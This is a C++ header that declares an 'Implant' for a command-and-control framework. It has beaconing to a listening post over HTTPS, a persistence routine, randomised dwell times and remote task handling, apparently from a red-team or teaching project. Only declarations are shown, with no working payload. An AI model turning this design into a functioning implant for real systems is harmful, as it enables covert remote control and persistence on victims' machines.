#pragma once // Cause the current source file to be included only once in a single compilation

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "tasks.h"

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>

#include <boost/property_tree/ptree.hpp>

struct Implant
{
	Implant(std::string host, std::string port, std::string uri);
	// The thread for servicing tasks
	std::future<void> taskThread;
	// Define public functions that the implant exposes
	void beacon();
	void persist();
	void setMeanDwell(double meanDwell);
	void setRunning(bool isRunning);
	void serviceTasks();

private:
	const std::string host, port, uri; // Listening post endpoint args
	// Variables for implant config,
	std::exponential_distribution<double> dwellDistributionSeconds;
	std::atomic_bool isRunning;
	std::mutex taskMutex, resultsMutex;
	boost::property_tree::ptree results;
	std::vector<Task> tasks;
	std::random_device device;

	void parseTasks(const std::string &response);
	[[nodiscard]] std::string sendResults();
};

// Function that make the HTTP requests to the listening port
[[nodiscard]] std::string sendHttpsRequest(std::string_view host,
										  std::string_view port,
										  std::string_view uri,
										  std::string_view payload);